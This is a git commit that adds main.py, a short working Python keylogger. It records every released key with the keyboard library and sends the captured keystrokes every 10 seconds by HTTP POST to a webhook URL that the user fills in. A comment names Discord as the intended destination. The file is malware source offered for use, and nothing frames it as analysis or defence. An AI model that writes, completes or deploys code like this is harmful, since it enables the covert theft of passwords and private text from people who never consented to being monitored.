0f9dc5a218e4d089058eb73af2ef9ae3f586d619
Jeevan Shetty <148848551+M4SOOM@users.noreply.github.com>
2023-10-24 20:34:00 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,35 @@
+import keyboard
+import time
+import requests
+import threading
+
+# Replace 'WEBHOOK_URL'
+WEBHOOK_URL = 'Enter your URL'
+
+# Create a list to store the captured keystrokes
+keylogs = []
+
+def send_keylogs():
+    global keylogs
+    if keylogs:
+        
+        keylogs_str = '\n'.join(keylogs)
+        payload = {
+            'content': keylogs_str
+        }
+        requests.post(WEBHOOK_URL, data=payload)
+        keylogs = []
+    threading.Timer(10, send_keylogs).start()
+
+
+def capture_keystrokes(event):
+    global keylogs
+    keylogs.append(event.name)
+
+keyboard.on_release(callback=capture_keystrokes)
+
+# Start sending keylogs to Discord every 10 seconds
+send_keylogs()
+
+while True:
+    time.sleep(1)
